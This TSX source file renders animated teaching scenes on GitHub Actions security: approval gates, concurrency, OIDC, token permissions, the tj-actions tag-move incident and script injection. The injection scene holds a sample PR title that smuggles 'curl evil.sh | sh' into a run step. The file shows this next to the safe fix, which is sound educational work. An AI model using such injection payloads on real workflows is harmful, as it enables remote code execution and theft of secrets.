// gha/ship.tsx — chapters 7–8: deploy pipeline + approval gate, concurrency (computed sim), OIDC,
// GITHUB_TOKEN permissions, supply-chain tag move (tj-actions, Mar 2025), script injection (computed).
import React from "react";
import { AbsoluteFill, useCurrentFrame } from "remotion";
import { mix, useP, MONO, SANS, Wire, Flow, Type } from "../../lib/primitives";
import { T, A, Win, HeadC, StatusIcon, St, Chip, CodeBlock, along, clamp01 } from "./core";

// ---------------------------------------------------------------- pipeline with environments + approval
export const PipelineScene: React.FC<{ dur?: number }> = ({ dur }) => {
  const frame = useCurrentFrame();
  const p = useP(dur);
  const stages = [
    { n: "build", i: "🔨", c: A.run, at: 0.04 }, { n: "test", i: "🧪", c: A.run, at: 0.07 },
    { n: "staging", i: "🌤️", c: A.act, at: 0.1, env: true }, { n: "approval", i: "🛂", c: A.evt, at: 0.3, gate: true },
    { n: "production", i: "🚀", c: A.ok, at: 0.13, env: true },
  ];
  const approved = p(0.66, 0.68) > 0.5;
  const X = (i: number) => 140 + i * 345;
  const pts = stages.map((_, i) => [X(i) + 145, 330] as [number, number]);
  let tpos: number;
  if (!approved) tpos = Math.min(3 / 4, ((frame % 200) / 200) * 1.3);
  else tpos = (frame % 160) / 160;
  const [tx, ty] = along(pts, tpos);
  const waiting = !approved && tpos >= 0.74;
  return (
    <AbsoluteFill>
      <HeadC kicker="CONTINUOUS DELIVERY" title="Environments, approvals and a human's final say" color={A.ok} o={p(0, 0.04)} />
      {pts.slice(0, -1).map((a, i) => <Wire key={i} x1={a[0] + 145} y1={330} x2={pts[i + 1][0] - 145} y2={330} p={p(stages[i + 1].at, stages[i + 1].at + 0.03)} color={mix(T.muted, stages[i + 1].c, 0.6)} />)}
      {stages.map((s, i) => {
        const o = p(s.at, s.at + 0.04);
        const isGate = !!s.gate;
        const done = tpos * 4 > i + 0.5 || (approved && tpos * 4 > i);
        const col = isGate ? (approved ? A.ok : A.evt) : s.c;
        return (
          <div key={i} style={{ position: "absolute", left: X(i), top: 240, width: 290, height: 180, borderRadius: 18, boxSizing: "border-box", padding: "16px 20px", background: mix(T.panel, col, isGate && waiting ? 0.25 : 0.1), border: `2.5px ${isGate ? "dashed" : "solid"} ${col}`, opacity: o, boxShadow: isGate && waiting ? `0 0 ${20 + Math.sin(frame * 0.15) * 12}px ${A.evt}` : "none" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <span style={{ fontSize: 40 }}>{s.i}</span>
              <span style={{ fontFamily: SANS, fontWeight: 800, fontSize: 30, color: T.text }}>{s.n}</span>
            </div>
            {s.env && <div style={{ marginTop: 12, opacity: p(0.2, 0.24) }}><Chip text={`environment: ${s.n}`} color={s.c} size={17} /></div>}
            {s.env && <div style={{ fontFamily: MONO, fontSize: 18, color: T.muted, marginTop: 8, opacity: p(0.24, 0.28) }}>🔒 own secrets · rules</div>}
            {isGate && <div style={{ fontFamily: MONO, fontSize: 20, color: col, marginTop: 14 }}>{approved ? "✓ approved" : "⏸ waiting for review"}</div>}
            {!isGate && !s.env && <div style={{ marginTop: 16 }}><StatusIcon s={done ? "ok" : "running"} size={30} /></div>}
          </div>
        );
      })}
      <div style={{ position: "absolute", left: tx - 15, top: ty - 110, width: 30, height: 30, borderRadius: 15, background: waiting ? A.evt : A.ok, border: `3px solid ${T.text}`, boxShadow: `0 0 20px ${waiting ? A.evt : A.ok}`, opacity: p(0.05, 0.08) }} />
      {/* env settings */}
      <Win x={100} y={470} w={860} h={400} title="Settings › Environments › production" color={A.evt} o={p(0.3, 0.34)}>
        {[
          { k: "Required reviewers", v: "@release-managers", at: 0.32 }, { k: "Wait timer", v: "10 minutes", at: 0.5 },
          { k: "Deployment branches", v: "main only", at: 0.53 }, { k: "Environment secrets", v: "PROD_DB_URL · 2 more", at: 0.22 },
        ].map((r, i) => (
          <div key={i} style={{ display: "flex", alignItems: "center", padding: "16px 26px", borderBottom: `1px solid ${T.line}`, opacity: p(r.at, r.at + 0.04) }}>
            <span style={{ fontFamily: SANS, fontSize: 26, color: T.text, width: 360 }}>{r.k}</span>
            <span style={{ fontFamily: MONO, fontSize: 23, color: A.evt }}>{r.v}</span>
          </div>
        ))}
      </Win>
      <div style={{ position: "absolute", left: 1000, top: 470, width: 820, height: 400, borderRadius: 16, background: T.bg1, border: `2px solid ${mix(T.line, A.ok, approved ? 0.8 : 0.3)}`, opacity: p(0.36, 0.4), padding: "22px 26px", boxSizing: "border-box" }}>
        <div style={{ fontFamily: SANS, fontWeight: 800, fontSize: 28, color: T.text }}>Review pending deployment</div>
        <div style={{ fontFamily: MONO, fontSize: 21, color: T.muted, marginTop: 8 }}>Deploy #46 → production</div>
        <div style={{ display: "flex", gap: 16, marginTop: 26 }}>
          <div style={{ padding: "14px 22px", borderRadius: 12, background: approved ? A.ok : mix(T.panel, A.ok, 0.25), color: approved ? T.bg0 : A.ok, fontFamily: SANS, fontWeight: 800, fontSize: 25, transform: `scale(${p(0.64, 0.66) > 0 && !approved ? 0.96 : 1})` }}>Approve and deploy</div>
          <div style={{ padding: "14px 22px", borderRadius: 12, border: `2px solid ${T.line}`, color: T.muted, fontFamily: SANS, fontWeight: 700, fontSize: 25 }}>Reject</div>
        </div>
        <div style={{ marginTop: 34, opacity: p(0.72, 0.76), display: "flex", alignItems: "center", gap: 14, padding: "14px 18px", borderRadius: 12, background: mix(T.panel, A.ok, 0.12), border: `1.5px solid ${A.ok}` }}>
          <StatusIcon s="ok" size={28} />
          <div>
            <div style={{ fontFamily: SANS, fontWeight: 700, fontSize: 24, color: T.text }}>Deployed to production · Active</div>
            <div style={{ fontFamily: MONO, fontSize: 20, color: A.run }}>https://acme.example ↗</div>
          </div>
        </div>
      </div>
    </AbsoluteFill>
  );
};

// ---------------------------------------------------------------- concurrency (computed simulation)
const PUSH_T = [0, 1.5, 3, 4.5], RUN_D = 4;
const NOCC = PUSH_T.map((t) => ({ s: t, e: t + RUN_D, st: "ok" as St }));
const WITHCC = PUSH_T.map((t, i) => {
  const next = PUSH_T[i + 1];
  const e = next !== undefined && next < t + RUN_D ? next : t + RUN_D;
  return { s: t, e, st: (e < t + RUN_D ? "cancel" : "ok") as St };
});
const MAXT = Math.max(...WITHCC.map((r) => r.e), ...NOCC.map((r) => r.e)); // 8.5
export const ConcurrencyScene: React.FC<{ dur?: number }> = ({ dur }) => {
  const frame = useCurrentFrame();
  const p = useP(dur);
  const X0 = 420, SC = 150, clock = ((frame % 240) / 240) * (MAXT + 0.5);
  const lane = (runs: { s: number; e: number; st: St }[], y: number, title: string, c: string, o: number, overlapWarn: boolean) => (
    <div style={{ opacity: o }}>
      <div style={{ position: "absolute", left: 100, top: y, width: 300, fontFamily: SANS, fontWeight: 800, fontSize: 28, color: c, lineHeight: 1.25 }}>{title}</div>
      {runs.map((r, i) => {
        const vis = clamp01((clock - r.s) / Math.max(0.01, r.e - r.s));
        const live = clock >= r.s && clock < r.e;
        const st: St = clock < r.s ? "queued" : live ? "running" : r.st;
        const col = st === "cancel" ? A.gray : st === "ok" ? A.ok : A.run;
        return (
          <React.Fragment key={i}>
          <div style={{ position: "absolute", left: X0 + r.s * SC, top: y + i * 52, height: 42, width: (r.e - r.s) * SC, borderRadius: 10, border: `2px dashed ${mix(T.line, col, 0.6)}`, boxSizing: "border-box", display: "flex", alignItems: "center", paddingLeft: 12 }}>
            {vis === 0 && <span style={{ fontFamily: MONO, fontSize: 19, color: T.muted, whiteSpace: "nowrap" }}>deploy #{i + 1}</span>}
          </div>
          {vis > 0 && <div style={{ position: "absolute", left: X0 + r.s * SC, top: y + i * 52, height: 42, width: Math.max(4, (r.e - r.s) * SC * vis), borderRadius: 10, background: mix(T.panel, col, 0.45), border: `2px solid ${col}`, display: "flex", alignItems: "center", gap: 8, paddingLeft: 10, boxSizing: "border-box", overflow: "hidden" }}>
            {vis > 0.05 && <StatusIcon s={st} size={24} />}
            {vis > 0.3 && <span style={{ fontFamily: MONO, fontSize: 19, color: T.text, whiteSpace: "nowrap" }}>deploy #{i + 1}{st === "cancel" ? " ✕" : ""}</span>}
          </div>}
          </React.Fragment>
        );
      })}
      {overlapWarn && <div style={{ position: "absolute", left: X0 + 1.5 * SC, top: y - 8, width: 2.5 * SC, height: 4 * 52 + 4, borderRadius: 12, border: `2px dashed ${A.bad}`, opacity: 0.5 + Math.sin(frame * 0.15) * 0.4 }} />}
    </div>
  );
  return (
    <AbsoluteFill>
      <HeadC kicker="concurrency:" title="Never let two deploys race" color={A.ok} o={p(0, 0.04)} />
      <Win x={100} y={200} w={820} h={200} title="deploy.yml" color={A.ok} o={p(0.16, 0.2)}>
        <CodeBlock lines={["concurrency:", "  group: deploy-${{ github.ref }}", "  cancel-in-progress: true"]} reveal={p(0.18, 0.3)} x={22} y={14} w={760} size={26} hi={p(0.34, 0.35) > 0.5 ? { a: 2, b: 2, c: A.evt } : { a: 1, b: 1, c: A.ok }} />
      </Win>
      <div style={{ position: "absolute", left: 980, top: 215, width: 840, fontFamily: SANS, fontSize: 27, color: T.text, lineHeight: 1.45 }}>
        <div style={{ opacity: p(0.2, 0.24) }}>• same <span style={{ color: A.ok, fontFamily: MONO }}>group</span> → never at the same time</div>
        <div style={{ opacity: p(0.34, 0.38) }}>• <span style={{ color: A.evt, fontFamily: MONO }}>cancel-in-progress</span> → newest run wins</div>
        <div style={{ opacity: p(0.76, 0.8), color: T.muted }}>• PRs: group by branch → stale runs cancelled</div>
      </div>
      {PUSH_T.map((t, i) => <div key={i} style={{ position: "absolute", left: X0 + t * SC - 16, top: 425, fontSize: 26, opacity: p(0.5, 0.53) }}>⬆️</div>)}
      <div style={{ position: "absolute", left: X0, top: 460, width: (MAXT + 0.5) * SC, height: 2, background: T.line, opacity: p(0.5, 0.53) }} />
      {lane(NOCC, 480, "Without concurrency", A.bad, p(0.52, 0.56), true)}
      {lane(WITHCC, 700, "With cancel-in-progress", A.ok, p(0.58, 0.62), false)}
      <div style={{ position: "absolute", left: X0 + clock * SC, top: 470, width: 3, height: 440, background: A.evt, boxShadow: `0 0 10px ${A.evt}`, opacity: p(0.52, 0.56) }} />
    </AbsoluteFill>
  );
};

// ---------------------------------------------------------------- OIDC
export const OidcScene: React.FC<{ dur?: number }> = ({ dur }) => {
  const frame = useCurrentFrame();
  const p = useP(dur);
  const actors = [
    { n: "your job", i: "⚙️", d: "needs cloud access", c: A.run, at: 0.36 },
    { n: "GitHub OIDC", i: "🪪", d: "signs a token", c: A.act, at: 0.4 },
    { n: "cloud IAM", i: "☁️", d: "AWS · Azure · GCP", c: A.evt, at: 0.5 },
    { n: "short-lived creds", i: "⏳", d: "expire ≤ 1 hour", c: A.ok, at: 0.6 },
  ];
  const X = (i: number) => 100 + i * 440;
  const left = Math.max(0, 60 - Math.floor(((frame % 1800) / 1800) * 60));
  return (
    <AbsoluteFill>
      <HeadC kicker="OPENID CONNECT (OIDC)" title="Cloud logins with no stored keys" color={A.ok} o={p(0, 0.04)} />
      <div style={{ position: "absolute", left: 100, top: 205, width: 760, height: 280, borderRadius: 20, background: mix(T.panel, A.bad, 0.07), border: `2.5px solid ${mix(T.line, A.bad, 0.6)}`, padding: "20px 26px", boxSizing: "border-box", opacity: p(0.03, 0.07) }}>
        <div style={{ fontFamily: SANS, fontWeight: 800, fontSize: 30, color: A.bad }}>The old way</div>
        <div style={{ fontFamily: MONO, fontSize: 23, color: T.text, marginTop: 14 }}>secrets.AWS_SECRET_ACCESS_KEY = 🔑 AKIA…</div>
        <div style={{ fontFamily: SANS, fontSize: 25, color: T.muted, marginTop: 16, opacity: p(0.14, 0.18) }}>leaks → works for <span style={{ color: A.bad, fontWeight: 700 }}>anyone</span>, for <span style={{ color: A.bad, fontWeight: 700 }}>months</span></div>
        {p(0.2, 0.24) > 0 && <div style={{ position: "absolute", left: 20, top: 130, width: 720, height: 6, background: A.bad, transform: `rotate(-8deg) scaleX(${p(0.2, 0.24)})`, transformOrigin: "left", borderRadius: 3 }} />}
      </div>
      <div style={{ position: "absolute", left: 900, top: 205, width: 920, height: 280, borderRadius: 20, background: T.bg1, border: `2px solid ${mix(T.line, A.act, 0.7)}`, padding: "20px 26px", boxSizing: "border-box", opacity: p(0.44, 0.48) }}>
        <div style={{ fontFamily: MONO, fontSize: 20, color: A.act }}>signed JWT · claims</div>
        {[["sub", "repo:acme/web:environment:production"], ["ref", "refs/heads/main"], ["aud", "sts.amazonaws.com"], ["iss", "token.actions.githubusercontent.com"]].map(([k, v], i) => (
          <div key={k} style={{ fontFamily: MONO, fontSize: 22, marginTop: 10, opacity: p(0.45 + i * 0.02, 0.47 + i * 0.02), whiteSpace: "nowrap" }}>
            <span style={{ color: A.key }}>{k}</span><span style={{ color: T.muted }}>: </span><span style={{ color: A.str }}>{v}</span>
          </div>
        ))}
      </div>
      {actors.slice(0, -1).map((a, i) => (
        <React.Fragment key={i}>
          <Wire x1={X(i) + 380} y1={660} x2={X(i + 1)} y2={660} p={p(actors[i + 1].at - 0.03, actors[i + 1].at)} color={actors[i + 1].c} />
          <Flow x1={X(i) + 380} y1={660} x2={X(i + 1)} y2={660} color={actors[i + 1].c} n={3} o={p(actors[i + 1].at, actors[i + 1].at + 0.03)} />
        </React.Fragment>
      ))}
      {actors.map((a, i) => {
        const o = p(a.at, a.at + 0.04);
        return (
          <div key={i} style={{ position: "absolute", left: X(i), top: 560, width: 380, height: 200, borderRadius: 20, boxSizing: "border-box", padding: "18px 22px", background: mix(T.panel, a.c, 0.1), border: `2.5px solid ${a.c}`, opacity: o, transform: `translateY(${(1 - o) * 20}px)` }}>
            <span style={{ fontSize: 44 }}>{a.i}</span>
            <div style={{ fontFamily: SANS, fontWeight: 800, fontSize: 30, color: T.text, marginTop: 6 }}>{a.n}</div>
            <div style={{ fontFamily: SANS, fontSize: 23, color: T.muted, marginTop: 4 }}>{a.d}</div>
            {i === 2 && <div style={{ position: "absolute", right: 16, top: 16, opacity: p(0.56, 0.6) }}><Chip text="trust policy ✓" color={A.ok} size={17} /></div>}
            {i === 3 && <div style={{ position: "absolute", right: 16, top: 18, fontFamily: MONO, fontWeight: 800, fontSize: 24, color: A.ok }}>{left}m</div>}
          </div>
        );
      })}
      <div style={{ position: "absolute", left: 100, top: 790, display: "flex", gap: 16, opacity: p(0.82, 0.86) }}>
        <Chip text="permissions: id-token: write" color={A.evt} size={24} solid />
        <Chip text="no cloud keys stored anywhere" color={A.ok} size={24} />
      </div>
    </AbsoluteFill>
  );
};

// ---------------------------------------------------------------- GITHUB_TOKEN permissions
type Lv = 0 | 1 | 2; // none read write
const SCOPES = ["contents", "pull-requests", "issues", "packages", "id-token", "deployments", "actions", "security-events"];
const LEGACY: Lv[] = [2, 2, 2, 2, 0, 2, 2, 2];
const DEFAULT: Lv[] = [1, 0, 0, 1, 0, 0, 0, 0];
const LEAST: Lv[] = [1, 2, 0, 0, 2, 0, 0, 0];
export const PermissionsScene: React.FC<{ dur?: number }> = ({ dur }) => {
  const frame = useCurrentFrame();
  const p = useP(dur);
  const stage = p(0.6, 0.62) > 0.5 ? 2 : p(0.4, 0.42) > 0.5 ? 1 : 0;
  const cur = [LEGACY, DEFAULT, LEAST][stage];
  const label = ["permissive (older repos)", "default for new repos: read-only", "least privilege for THIS job"][stage];
  const blast = [100, 30, 12][stage];
  const life = 1 - ((frame % 240) / 240);
  return (
    <AbsoluteFill>
      <HeadC kicker="GITHUB_TOKEN" title="An automatic token — scoped by permissions:" color={A.bad} o={p(0, 0.04)} />
      <div style={{ position: "absolute", left: 100, top: 205, width: 640, height: 250, borderRadius: 20, background: mix(T.panel, A.evt, 0.1), border: `2.5px solid ${A.evt}`, padding: "22px 26px", boxSizing: "border-box", opacity: p(0.03, 0.07) }}>
        <div style={{ fontFamily: SANS, fontWeight: 800, fontSize: 32, color: T.text }}>🎟️ GITHUB_TOKEN</div>
        <div style={{ display: "flex", gap: 10, flexWrap: "wrap", marginTop: 14, opacity: p(0.1, 0.14) }}>
          {["comment on PR", "push a tag", "publish package"].map((t) => <Chip key={t} text={t} color={A.run} size={19} />)}
        </div>
        <div style={{ fontFamily: MONO, fontSize: 20, color: T.muted, marginTop: 20, opacity: p(0.2, 0.24) }}>lifetime: expires when the job ends</div>
        <div style={{ marginTop: 8, height: 14, borderRadius: 7, background: T.bg1, opacity: p(0.2, 0.24) }}>
          <div style={{ width: `${life * 100}%`, height: 14, borderRadius: 7, background: life < 0.15 ? A.bad : A.evt }} />
        </div>
      </div>
      <Win x={100} y={490} w={640} h={260} title="workflow.yml" color={A.ok} o={p(0.6, 0.64)}>
        <CodeBlock lines={["permissions:", "  contents: read", "  pull-requests: write", "  id-token: write"]} reveal={p(0.62, 0.7)} x={22} y={16} w={580} size={26} />
      </Win>
      <div style={{ position: "absolute", left: 100, top: 780, width: 640, opacity: p(0.8, 0.84) }}>
        <div style={{ fontFamily: SANS, fontSize: 24, color: T.text }}>🦹 hijacked step's blast radius</div>
        <div style={{ marginTop: 10, height: 26, borderRadius: 8, background: T.bg1 }}>
          <div style={{ width: `${blast}%`, height: 26, borderRadius: 8, background: blast > 50 ? A.bad : A.ok }} />
        </div>
      </div>
      <div style={{ position: "absolute", left: 800, top: 205, width: 1020, height: 670, borderRadius: 20, background: T.bg1, border: `2px solid ${T.line}`, opacity: p(0.26, 0.3), padding: "20px 28px", boxSizing: "border-box" }}>
        <div style={{ display: "flex", fontFamily: MONO, fontSize: 21, color: T.muted, marginBottom: 8 }}>
          <span style={{ width: 380 }}>scope</span>{["none", "read", "write"].map((h) => <span key={h} style={{ width: 170, textAlign: "center" }}>{h}</span>)}
        </div>
        {SCOPES.map((s, i) => (
          <div key={s} style={{ display: "flex", alignItems: "center", height: 60, borderTop: `1px solid ${T.line}` }}>
            <span style={{ width: 380, fontFamily: MONO, fontSize: 25, color: T.text }}>{s}</span>
            {[0, 1, 2].map((lv) => {
              const on = cur[i] === lv;
              const c = lv === 2 ? A.bad : lv === 1 ? A.run : A.gray;
              return <span key={lv} style={{ width: 170, display: "flex", justifyContent: "center" }}>
                <span style={{ width: 34, height: 34, borderRadius: 17, border: `2.5px solid ${on ? c : T.line}`, background: on ? c : "transparent", boxShadow: on && lv === 2 && stage === 0 ? `0 0 ${10 + Math.sin(frame * 0.2 + i) * 6}px ${A.bad}` : "none" }} />
              </span>;
            })}
          </div>
        ))}
        <div style={{ marginTop: 16, fontFamily: SANS, fontWeight: 700, fontSize: 27, color: stage === 0 ? A.bad : stage === 1 ? A.run : A.ok }}>{label}</div>
      </div>
    </AbsoluteFill>
  );
};

// ---------------------------------------------------------------- supply chain: tags can move
export const SupplyScene: React.FC<{ dur?: number }> = ({ dur }) => {
  const frame = useCurrentFrame();
  const p = useP(dur);
  const moved = ease01(p(0.28, 0.36));
  const commits = ["9f1c2e", "3b7d44", "a5b3ab", "e81f09"];
  const CX = (i: number) => 820 + i * 240, CY = 330;
  const evil = [1540, 540] as [number, number];
  const tagX = CX(3) + (evil[0] - CX(3)) * moved, tagY = CY - 90 + (evil[1] - CY) * moved;
  const hit = p(0.42, 0.46) > 0.5;
  const repos = [
    { n: "repo-1", ref: "@v35", pinned: false }, { n: "repo-2", ref: "@v35", pinned: false },
    { n: "repo-3", ref: "@a5b3ab…  # v35", pinned: true },
  ];
  return (
    <AbsoluteFill>
      <HeadC kicker="SUPPLY CHAIN" title="A tag is a pointer — and pointers can move" color={A.bad} o={p(0, 0.04)} />
      <div style={{ position: "absolute", left: 780, top: 205, opacity: p(0.26, 0.3) }}><Chip text="March 2025 · tj-actions/changed-files · CVE-2025-30066" color={A.bad} size={21} /></div>
      <div style={{ position: "absolute", left: CX(0), top: CY - 2, width: CX(3) - CX(0), height: 4, background: mix(T.line, A.run, 0.6), opacity: p(0.03, 0.08) }} />
      {commits.map((c, i) => (
        <div key={c} style={{ position: "absolute", left: CX(i) - 60, top: CY - 26, width: 120, textAlign: "center", opacity: p(0.03 + i * 0.02, 0.06 + i * 0.02) }}>
          <div style={{ width: 52, height: 52, borderRadius: 26, margin: "0 auto", background: mix(T.panel, A.run, 0.3), border: `3px solid ${A.run}` }} />
          <div style={{ fontFamily: MONO, fontSize: 20, color: T.muted, marginTop: 8 }}>{c}</div>
        </div>
      ))}
      <div style={{ position: "absolute", left: evil[0] - 40, top: evil[1] - 40, width: 80, height: 80, borderRadius: 40, background: mix(T.panel, A.bad, 0.4), border: `3px solid ${A.bad}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 40, opacity: p(0.28, 0.32), boxShadow: `0 0 ${20 + Math.sin(frame * 0.15) * 10}px ${A.bad}` }}>💀</div>
      <div style={{ position: "absolute", left: evil[0] + 60, top: evil[1] - 20, fontFamily: MONO, fontSize: 21, color: A.bad, opacity: p(0.3, 0.34) }}>malicious commit</div>
      <div style={{ position: "absolute", left: tagX - 60, top: tagY - 40, width: 120, height: 44, borderRadius: 10, background: moved > 0.5 ? A.bad : A.evt, display: "flex", alignItems: "center", justifyContent: "center", fontFamily: MONO, fontWeight: 800, fontSize: 24, color: T.bg0, opacity: p(0.1, 0.14) }}>🏷 v35</div>
      <div style={{ position: "absolute", left: tagX - 2, top: tagY + 4, width: 4, height: 30, background: moved > 0.5 ? A.bad : A.evt, opacity: p(0.1, 0.14) }} />
      <div style={{ position: "absolute", left: CX(2) - 70, top: CY + 60, width: 140, textAlign: "center", opacity: p(0.58, 0.62) }}>
        <Chip text="📌 pinned" color={A.ok} size={19} />
      </div>
      {repos.map((r, i) => {
        const bad = hit && !r.pinned;
        const safe = r.pinned && p(0.6, 0.64) > 0.5;
        const o = p(r.pinned ? 0.58 : 0.4 + i * 0.02, (r.pinned ? 0.62 : 0.43 + i * 0.02));
        const c = bad ? A.bad : safe ? A.ok : A.run;
        return (
          <div key={i} style={{ position: "absolute", left: 100, top: 205 + i * 175, width: 640, height: 155, borderRadius: 18, boxSizing: "border-box", padding: "16px 22px", background: mix(T.panel, c, 0.1), border: `2.5px solid ${c}`, opacity: o }}>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <StatusIcon s={bad ? "fail" : safe ? "ok" : "running"} size={28} />
              <span style={{ fontFamily: SANS, fontWeight: 800, fontSize: 27, color: T.text }}>{r.n}</span>
            </div>
            <div style={{ fontFamily: MONO, fontSize: 19, color: A.evt, marginTop: 10, whiteSpace: "nowrap" }}>uses: tj-actions/changed-files{r.ref}</div>
            <div style={{ fontFamily: MONO, fontSize: 19, color: bad ? A.bad : A.ok, marginTop: 8 }}>{bad ? "⚠ secrets dumped into public log" : safe ? "✓ still runs the audited commit" : ""}</div>
          </div>
        );
      })}
      <div style={{ position: "absolute", left: 800, top: 650, width: 1020, opacity: p(0.46, 0.5), fontFamily: SANS, fontSize: 27, color: T.text, lineHeight: 1.4 }}>
        Tens of thousands of repos referenced it — and pulled the bad code automatically.
      </div>
      <div style={{ position: "absolute", left: 100, top: 760, width: 1720, height: 110, borderRadius: 16, background: T.bg1, border: `2px solid ${A.ok}`, opacity: p(0.8, 0.84), padding: "14px 24px", boxSizing: "border-box" }}>
        <div style={{ fontFamily: MONO, fontSize: 23, color: T.text, whiteSpace: "nowrap" }}><span style={{ color: A.key }}>uses:</span> <span style={{ color: A.str }}>some-org/some-action@<span style={{ color: A.ok }}>8e5e7e5ab8b370d6c329ec480221332ada57f0ab</span></span> <span style={{ color: T.muted }}># v4.2.0</span></div>
        <div style={{ fontFamily: SANS, fontSize: 22, color: A.ok, marginTop: 8 }}>pin third-party actions to a full commit hash · 🤖 Dependabot opens the upgrade PRs</div>
      </div>
    </AbsoluteFill>
  );
};
const ease01 = (v: number) => (v < 0.5 ? 2 * v * v : 1 - Math.pow(-2 * v + 2, 2) / 2);

// ---------------------------------------------------------------- script injection (computed)
const TITLE = 'a"; curl evil.sh | sh; echo "';
const TEMPLATE = 'echo "Title: ${{ github.event.pull_request.title }}"';
const RENDERED = TEMPLATE.replace("${{ github.event.pull_request.title }}", TITLE);
const CMDS = RENDERED.split(";").map((s) => s.trim());
export const InjectionScene: React.FC<{ dur?: number }> = ({ dur }) => {
  const frame = useCurrentFrame();
  const p = useP(dur);
  return (
    <AbsoluteFill>
      <HeadC kicker="SCRIPT INJECTION" title="Untrusted text + ${{ }} in run: = remote code" color={A.bad} o={p(0, 0.04)} />
      <div style={{ position: "absolute", left: 100, top: 200, width: 900, fontFamily: MONO, fontWeight: 800, fontSize: 24, color: A.bad, opacity: p(0.04, 0.08) }}>✕ VULNERABLE</div>
      <Win x={100} y={240} w={900} h={130} title="step" color={A.bad} o={p(0.05, 0.09)}>
        <div style={{ position: "absolute", left: 22, top: 22, fontFamily: MONO, fontSize: 22, whiteSpace: "nowrap" }}>
          <span style={{ color: A.key }}>- run: </span><span style={{ color: A.str }}>echo "Title: </span><span style={{ color: A.evt, fontWeight: 700 }}>{"${{ github.event.pull_request.title }}"}</span><span style={{ color: A.str }}>"</span>
        </div>
      </Win>
      <div style={{ position: "absolute", left: 100, top: 395, width: 900, height: 96, borderRadius: 14, background: mix(T.panel, A.bad, 0.08), border: `2px solid ${mix(T.line, A.bad, 0.6)}`, padding: "12px 20px", boxSizing: "border-box", opacity: p(0.2, 0.24) }}>
        <div style={{ fontFamily: SANS, fontSize: 20, color: T.muted }}>🦹 PR title (anyone can write this)</div>
        <Type text={TITLE} p={p(0.24, 0.34)} color={A.bad} mono size={26} />
      </div>
      <div style={{ position: "absolute", left: 100, top: 515, width: 900, height: 110, borderRadius: 14, background: T.bg0, border: `1.5px solid ${T.line}`, padding: "12px 20px", boxSizing: "border-box", opacity: p(0.4, 0.44) }}>
        <div style={{ fontFamily: SANS, fontSize: 20, color: T.muted }}>what the shell receives (pasted before running)</div>
        <div style={{ fontFamily: MONO, fontSize: 22, color: T.text, marginTop: 8, whiteSpace: "nowrap" }}>
          {RENDERED.split(TITLE)[0]}<span style={{ color: A.bad, background: mix(T.bg0, A.bad, 0.2) }}>{TITLE}</span>{RENDERED.split(TITLE)[1]}
        </div>
      </div>
      <div style={{ position: "absolute", left: 100, top: 645, width: 900, opacity: p(0.46, 0.5) }}>
        {CMDS.map((c, i) => {
          const evil = c.includes("curl");
          return (
            <div key={i} style={{ display: "flex", alignItems: "center", gap: 14, marginBottom: 10, opacity: p(0.47 + i * 0.02, 0.49 + i * 0.02) }}>
              <span style={{ fontFamily: MONO, fontSize: 20, color: T.muted, width: 110 }}>cmd {i + 1}</span>
              <span style={{ fontFamily: MONO, fontSize: 23, color: evil ? A.bad : T.text, fontWeight: evil ? 800 : 400, padding: "4px 12px", borderRadius: 8, background: evil ? mix(T.bg0, A.bad, 0.2 + Math.sin(frame * 0.15) * 0.1) : "transparent" }}>{c}</span>
              {evil && <span style={{ fontFamily: SANS, fontWeight: 800, fontSize: 22, color: A.bad }}>⚠ executed</span>}
            </div>
          );
        })}
      </div>
      <div style={{ position: "absolute", left: 1060, top: 200, width: 760, fontFamily: MONO, fontWeight: 800, fontSize: 24, color: A.ok, opacity: p(0.62, 0.66) }}>✓ SAFE</div>
      <Win x={1060} y={240} w={760} h={200} title="step" color={A.ok} o={p(0.62, 0.66)}>
        <CodeBlock lines={["- env:", "    TITLE: ${{ github.event.pull_request.title }}", '  run: echo "Title: $TITLE"']} reveal={p(0.64, 0.7)} x={20} y={16} w={720} size={21} numbers={false} />
      </Win>
      <div style={{ position: "absolute", left: 1060, top: 465, width: 760, height: 160, borderRadius: 14, background: T.bg0, border: `1.5px solid ${A.ok}`, padding: "14px 20px", boxSizing: "border-box", opacity: p(0.7, 0.74) }}>
        <div style={{ fontFamily: SANS, fontSize: 20, color: T.muted }}>output — the title is just data</div>
        <div style={{ fontFamily: MONO, fontSize: 22, color: A.ok, marginTop: 10, whiteSpace: "nowrap" }}>Title: {TITLE}</div>
        <div style={{ fontFamily: SANS, fontSize: 22, color: T.text, marginTop: 10 }}>1 command · nothing injected</div>
      </div>
      <div style={{ position: "absolute", left: 1060, top: 660, width: 760, borderRadius: 16, padding: "16px 22px", boxSizing: "border-box", background: mix(T.panel, A.bad, 0.12), border: `2.5px solid ${A.bad}`, opacity: p(0.84, 0.88) }}>
        <div style={{ fontFamily: MONO, fontWeight: 800, fontSize: 24, color: A.bad }}>⚠ on: pull_request_target</div>
        <div style={{ fontFamily: SANS, fontSize: 23, color: T.text, marginTop: 6 }}>runs with secrets — even for PRs from forks. Never check out & run fork code there.</div>
      </div>
    </AbsoluteFill>
  );
};
